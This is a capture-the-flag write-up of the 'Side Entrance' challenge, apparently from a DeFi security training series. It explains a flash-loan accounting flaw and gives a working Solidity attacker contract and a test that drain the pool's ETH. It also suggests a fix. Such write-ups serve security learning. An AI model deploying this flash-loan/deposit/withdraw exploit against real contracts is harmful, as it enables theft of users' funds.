# Side Entrance

## analyse

Our goal is to decrease SideEntranceLenderPool's balance to zero ETH and attacker gets 'attackerInitialEthBalance' ETH. So it is transfer the pool's balance to attacker's account.

```js
after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
```

SideEntranceLenderPool has a mapping `balances`, it allows anyone to deposit and withdraw their liquidity. 

There is a logical error in the following code: When calling flashloan(), SideEntranceLenderPool will only check whether its balance decrease or not. But if we flashLoan a lot of money, and then use it to deposit, the address(this).balances will not change! We can pass it. And because we have recorded mapping `balances`(by deposit()), we can withdraw it!

```solidity
balances[msg.sender] += msg.value;

require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
```

I think it is a logical error. Balance check should not be the contract's balance while deposit() will change it. In order to correct it, maybe it could change contract balance check to the mapping `balances` check.

## solution

- SideEntranceAttacker

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker {

    SideEntranceLenderPool private immutable pool;
    address payable attacker;

    constructor (address poolAddress, address attackerAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        attacker = payable(attackerAddress);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }

    receive () external payable {
        attacker.transfer(msg.value);
    }
}
```

- test

```js
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const SideEntranceAttackerFactory = await ethers.getContractFactory('SideEntranceAttacker', deployer);
        const attackerContract = await SideEntranceAttackerFactory.deploy(this.pool.address, attacker.address);
        await attackerContract.connect(attacker).attack(ETHER_IN_POOL);
    });
